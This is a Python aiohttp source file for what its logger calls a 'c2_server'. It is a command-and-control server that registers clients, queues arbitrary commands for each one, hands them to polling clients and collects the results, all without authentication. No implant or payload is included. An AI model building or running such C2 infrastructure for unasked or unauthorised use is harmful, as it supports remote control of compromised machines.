import aiohttp
from aiohttp import web
import json
import uuid
import datetime
import asyncio
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('c2_server')

# In-memory storage for commands and results
class CommandStore:
    def __init__(self):
        # Structure: {client_id: [{"id": cmd_id, "command": cmd, "status": status, "result": result, "timestamp": timestamp}, ...]}
        self.client_commands = {}
        
        # Structure: {cmd_id: {"client_id": client_id, "command": cmd, "status": status, "result": result, "timestamp": timestamp}}
        self.command_details = {}
    
    def register_client(self, client_id):
        if client_id not in self.client_commands:
            self.client_commands[client_id] = []
            logger.info(f"Client registered: {client_id}")
    
    def add_command(self, client_id, command):
        # Generate a unique command ID
        cmd_id = str(uuid.uuid4())
        
        # Create command object
        cmd_obj = {
            "id": cmd_id,
            "command": command,
            "status": "pending",
            "result": None,
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        # Add to both data structures
        if client_id not in self.client_commands:
            self.register_client(client_id)
            
        self.client_commands[client_id].append(cmd_obj)
        self.command_details[cmd_id] = {
            "client_id": client_id,
            "command": command,
            "status": "pending",
            "result": None,
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        logger.info(f"Command added - ID: {cmd_id}, Client: {client_id}, Command: {command}")
        return cmd_id
    
    def get_pending_commands(self, client_id):
        if client_id not in self.client_commands:
            return []
        
        # Get pending commands for the client
        pending = [cmd for cmd in self.client_commands[client_id] if cmd["status"] == "pending"]
        
        # Mark these commands as sent
        for cmd in pending:
            cmd["status"] = "sent"
            self.command_details[cmd["id"]]["status"] = "sent"
        
        logger.info(f"Sent {len(pending)} commands to client {client_id}")
        return pending
    
    def update_command_result(self, cmd_id, result):
        if cmd_id not in self.command_details:
            logger.warning(f"Attempted to update unknown command: {cmd_id}")
            return False
        
        # Update in command_details
        self.command_details[cmd_id]["status"] = "completed"
        self.command_details[cmd_id]["result"] = result
        
        # Find and update in client_commands
        client_id = self.command_details[cmd_id]["client_id"]
        for cmd in self.client_commands[client_id]:
            if cmd["id"] == cmd_id:
                cmd["status"] = "completed"
                cmd["result"] = result
                break
        
        logger.info(f"Command completed - ID: {cmd_id}, Client: {client_id}")
        return True
    
    def list_clients(self):
        return list(self.client_commands.keys())
    
    def get_client_commands(self, client_id):
        if client_id not in self.client_commands:
            return []
        return self.client_commands[client_id]
    
    def get_command_details(self, cmd_id):
        if cmd_id not in self.command_details:
            return None
        return self.command_details[cmd_id]

# Initialize command store
command_store = CommandStore()

# API endpoints
async def register_client(request):
    data = await request.json()
    client_id = data.get("client_id", str(uuid.uuid4()))
    command_store.register_client(client_id)
    return web.json_response({"status": "success", "client_id": client_id})

async def get_commands(request):
    data = await request.json()
    client_id = data.get("client_id")
    
    if not client_id:
        return web.json_response({"status": "error", "message": "Client ID required"}, status=400)
    
    commands = command_store.get_pending_commands(client_id)
    return web.json_response({"status": "success", "commands": commands})

async def submit_result(request):
    data = await request.json()
    cmd_id = data.get("cmd_id")
    result = data.get("result")
    
    if not cmd_id or result is None:
        return web.json_response({"status": "error", "message": "Command ID and result required"}, status=400)
    
    success = command_store.update_command_result(cmd_id, result)
    if success:
        return web.json_response({"status": "success"})
    else:
        return web.json_response({"status": "error", "message": "Command not found"}, status=404)

async def send_command(request):
    data = await request.json()
    client_id = data.get("client_id")
    command = data.get("command")
    
    if not client_id or not command:
        return web.json_response({"status": "error", "message": "Client ID and command required"}, status=400)
    
    cmd_id = command_store.add_command(client_id, command)
    return web.json_response({"status": "success", "cmd_id": cmd_id})

async def list_clients(request):
    clients = command_store.list_clients()
    return web.json_response({"status": "success", "clients": clients})

async def get_client_history(request):
    client_id = request.match_info.get('client_id')
    if not client_id:
        return web.json_response({"status": "error", "message": "Client ID required"}, status=400)
    
    commands = command_store.get_client_commands(client_id)
    return web.json_response({"status": "success", "commands": commands})

async def get_command_status(request):
    cmd_id = request.match_info.get('cmd_id')
    if not cmd_id:
        return web.json_response({"status": "error", "message": "Command ID required"}, status=400)
    
    details = command_store.get_command_details(cmd_id)
    if details:
        return web.json_response({"status": "success", "command": details})
    else:
        return web.json_response({"status": "error", "message": "Command not found"}, status=404)

# Create web application
app = web.Application()
app.add_routes([
    web.post('/api/register', register_client),
    web.post('/api/commands/get', get_commands),
    web.post('/api/commands/submit', submit_result),
    web.post('/api/commands/send', send_command),
    web.get('/api/clients', list_clients),
    web.get('/api/clients/{client_id}/history', get_client_history),
    web.get('/api/commands/{cmd_id}', get_command_status)
])

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=8080)
    logger.info("C2 server started on port 8080")
